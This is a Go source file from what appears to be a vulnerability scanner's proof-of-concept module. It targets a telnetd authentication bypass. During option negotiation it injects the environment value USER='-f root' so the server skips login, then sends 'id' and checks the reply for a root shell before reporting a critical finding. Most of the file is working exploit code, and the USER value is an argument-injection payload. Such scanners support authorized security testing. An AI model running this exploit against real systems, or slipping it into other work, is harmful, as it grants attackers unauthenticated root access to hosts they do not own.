package gopocs

import (
	"bytes"
	"fmt"
	"github.com/P0lar1ght/argus/scanner/ddout"
	"github.com/P0lar1ght/argus/scanner/structs"
	"net"
	"strings"
	"time"

	"github.com/projectdiscovery/gologger"
)

// Telnet 协议常量
const (
	IAC_BYTE  = byte(255)
	DONT_BYTE = byte(254)
	DO_BYTE   = byte(253)
	WONT_BYTE = byte(252)
	WILL_BYTE = byte(251)
	SB_BYTE   = byte(250)
	SE_BYTE   = byte(240)

	OPT_ECHO_BYTE        = byte(1)
	OPT_SGA_BYTE         = byte(3)
	OPT_TTYPE_BYTE       = byte(24)
	OPT_NAWS_BYTE        = byte(31)
	OPT_NEW_ENVIRON_BYTE = byte(39)

	ENV_IS_BYTE    = byte(0)
	ENV_SEND_BYTE  = byte(1)
	ENV_VAR_BYTE   = byte(0)
	ENV_VALUE_BYTE = byte(1)
)

func TelnetBypassScan(info *structs.HostInfo) (bool, error) {
	gologger.Info().Msgf("[Go] [TelnetBypass] Start checking %s:%s", info.Host, info.Ports)
	address := net.JoinHostPort(info.Host, info.Ports)
	// 连接超时设置为5秒
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		gologger.Info().Msgf("[Go] [TelnetBypass] Connection failed to %s: %s", address, err)
		return false, err
	}
	defer conn.Close()

	// Initial negotiation
	// Send WILL NEW_ENVIRON, WILL TTYPE, WILL NAWS
	if _, err := conn.Write([]byte{IAC_BYTE, WILL_BYTE, OPT_NEW_ENVIRON_BYTE}); err != nil {
		return false, err
	}
	if _, err := conn.Write([]byte{IAC_BYTE, WILL_BYTE, OPT_TTYPE_BYTE}); err != nil {
		return false, err
	}
	if _, err := conn.Write([]byte{IAC_BYTE, WILL_BYTE, OPT_NAWS_BYTE}); err != nil {
		return false, err
	}

	buffer := make([]byte, 4096)
	// 状态标志
	exploitSent := false
	var exploitPayload []byte
	// newEnvironSupported := false // 暂时保留变量，用于后续可能的调试
	startTime := time.Now()

	// Negotiation Ioop
	for time.Since(startTime) < 5*time.Second {
		conn.SetReadDeadline(time.Now().Add(1500 * time.Millisecond))
		n, err := conn.Read(buffer)

		if err != nil {
			if exploitSent {
				break
			} // 已发送 Payload，可以退出循环去验证
			// 超时处理
			if nErr, ok := err.(net.Error); ok && nErr.Timeout() && n == 0 {
				continue
			}
			break
		}

		if n == 0 {
			if exploitSent {
				break
			}
			continue
		}

		data := buffer[:n]
		i := 0
		for i < len(data) {
			if data[i] != IAC_BYTE {
				i++
				continue
			}
			if i+1 >= len(data) {
				break
			}
			cmd := data[i+1]

			if cmd == DO_BYTE {
				if i+2 >= len(data) {
					break
				}
				opt := data[i+2]

				if opt == OPT_NEW_ENVIRON_BYTE {
					// Server 允许我们使用 NEW_ENVIRON
					conn.Write([]byte{IAC_BYTE, WILL_BYTE, OPT_NEW_ENVIRON_BYTE})
					// newEnvironSupported = true
				} else if opt == OPT_TTYPE_BYTE {
					conn.Write([]byte{IAC_BYTE, WILL_BYTE, OPT_TTYPE_BYTE})
				} else if opt == OPT_NAWS_BYTE {
					conn.Write([]byte{IAC_BYTE, WILL_BYTE, OPT_NAWS_BYTE})
					conn.Write([]byte{IAC_BYTE, SB_BYTE, OPT_NAWS_BYTE, 0, 80, 0, 24, IAC_BYTE, SE_BYTE})
				} else {
					conn.Write([]byte{IAC_BYTE, WONT_BYTE, opt})
				}
				i += 3
			} else if cmd == WILL_BYTE {
				if i+2 >= len(data) {
					break
				}
				opt := data[i+2]
				if opt == OPT_ECHO_BYTE || opt == OPT_SGA_BYTE {
					conn.Write([]byte{IAC_BYTE, DO_BYTE, opt})
				} else {
					conn.Write([]byte{IAC_BYTE, DONT_BYTE, opt})
				}
				i += 3
			} else if cmd == WONT_BYTE || cmd == DONT_BYTE {
				if i+2 >= len(data) {
					break
				}
				i += 3
			} else if cmd == SB_BYTE {
				seIndex := bytes.Index(data[i:], []byte{IAC_BYTE, SE_BYTE})
				if seIndex == -1 {
					i = len(data) // Skip rest
					break
				}
				sePos := i + seIndex
				if i+2 < sePos {
					subData := data[i+2 : sePos]
					if len(subData) >= 2 {
						opt := subData[0]
						subcmd := subData[1]

						if opt == OPT_NEW_ENVIRON_BYTE && subcmd == ENV_SEND_BYTE {
							// 核心触发点：服务器请求 ENV
							if !exploitSent {
								payload := []byte{
									IAC_BYTE, SB_BYTE, OPT_NEW_ENVIRON_BYTE, ENV_IS_BYTE,
									ENV_VAR_BYTE,
								}
								payload = append(payload, []byte("USER")...)
								payload = append(payload, ENV_VALUE_BYTE)
								payload = append(payload, []byte("-f root")...)
								payload = append(payload, IAC_BYTE, SE_BYTE)

								conn.Write(payload)
								exploitPayload = append([]byte(nil), payload...)
								exploitSent = true
							}
						} else if opt == OPT_TTYPE_BYTE {
							conn.Write(append([]byte{IAC_BYTE, SB_BYTE, OPT_TTYPE_BYTE, 0}, append([]byte("xterm-256color"), IAC_BYTE, SE_BYTE)...))
						}
					}
				}
				i = sePos + 2
			} else {
				i += 2
			}
		}
	}

	// 验证阶段 - 仿照 Python 逻辑
	if !exploitSent {
		return false, nil
	}

	time.Sleep(300 * time.Millisecond)

	// 直接发送 id 命令
	_, err = conn.Write([]byte("id\n"))
	if err != nil {
		gologger.Info().Msgf("[Go] [TelnetBypass] Failed to send id command: %s", err)
		return false, err
	}

	// 循环读取响应
	var totalResponse []byte
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	// 尝试读取多次，类似 Python 的 for range(3)
	for i := 0; i < 3; i++ {
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if n > 0 {
			totalResponse = append(totalResponse, buf[:n]...)
		}

		// 检查此刻是否已经满足条件，如果满足及早退出
		cleanData := stripTelnetCommands(totalResponse)
		output := strings.ToLower(string(cleanData))

		if IsRootShell(cleanData) {
			break
		}
		if strings.Contains(output, "login:") || strings.Contains(output, "password:") {
			break
		}

		if err != nil {
			break
		}
		// 稍微等待下一次读取
		time.Sleep(200 * time.Millisecond)
	}

	cleanResp := stripTelnetCommands(totalResponse)
	finalOutput := string(cleanResp)

	// gologger.Info().Msgf("[Debug] Final Check Response: %s", finalOutput)

	if IsRootShell(cleanResp) {
		verificationRequest := append(append([]byte(nil), exploitPayload...), []byte("id\n")...)
		exchanges := []structs.GoPocExchange{
			binaryGoPocExchange("Telnet environment bypass and root-shell verification", verificationRequest, totalResponse),
		}
		reportVulnerability(info, fmt.Sprintf("ID Command Output: %s", finalOutput), exchanges)
		return true, nil
	}

	return false, nil
}

func readAllAvailable(conn net.Conn) ([]byte, error) {
	var out []byte
	buf := make([]byte, 4096)

	// 第一次读取等待长一点，因为 Exploit 生效需要时间
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	for {
		n, err := conn.Read(buf)
		if n > 0 {
			out = append(out, buf[:n]...)
		}
		if err != nil {
			break
		}
		// 只要有数据，就继续快速读取剩余的
		conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
	}
	return out, nil
}

func stripTelnetCommands(data []byte) []byte {
	var res []byte
	i := 0
	for i < len(data) {
		if data[i] == IAC_BYTE {
			if i+1 < len(data) {
				cmd := data[i+1]
				if cmd == DO_BYTE || cmd == DONT_BYTE || cmd == WILL_BYTE || cmd == WONT_BYTE {
					i += 3
					continue
				} else if cmd == SB_BYTE {
					seIndex := bytes.Index(data[i:], []byte{IAC_BYTE, SE_BYTE})
					if seIndex != -1 {
						i += seIndex + 2
						continue
					}
				} else if cmd == IAC_BYTE {
					res = append(res, IAC_BYTE)
					i += 2
					continue
				}
			}
			i += 2
		} else {
			res = append(res, data[i])
			i++
		}
	}
	return res
}

func IsRootShell(data []byte) bool {
	s := strings.ToLower(string(data))
	// 常见的 root shell 特征
	return strings.Contains(s, "uid=0") ||
		(strings.Contains(s, "root@") && strings.Contains(s, "#")) ||
		(strings.Contains(s, "#") && !strings.Contains(s, "login") && !strings.Contains(s, "password"))
}

func reportVulnerability(info *structs.HostInfo, trigger string, exchanges []structs.GoPocExchange) {
	showData := fmt.Sprintf("Host: %v:%v\nPayload: USER=\"-f root\"\nTrigger: %s", info.Host, info.Ports, trigger)
	result := fmt.Sprintf("Telnet://%v:%v CVE-2026-PENDING Auth Bypass", info.Host, info.Ports)

	info.Emit(ddout.OutputMessage{
		Type: "GoPoc",
		GoPoc: ddout.GoPocsResultType{
			PocName:     "Telnet-Auth-Bypass",
			Security:    "CRITICAL",
			Target:      info.Host + ":" + info.Ports,
			InfoLeft:    showData,
			Exchanges:   exchanges,
			Description: "Telnetd Authentication Bypass (CVE-Pending)",
			ShowMsg:     result},
	})

	writeResult(info, structs.GoPocsResultType{
		PocName:     "Telnet-Auth-Bypass",
		Security:    "CRITICAL",
		Target:      info.Host + ":" + info.Ports,
		InfoLeft:    showData,
		Exchanges:   exchanges,
		Description: "Telnetd Authentication Bypass (CVE-Pending)",
	})
}
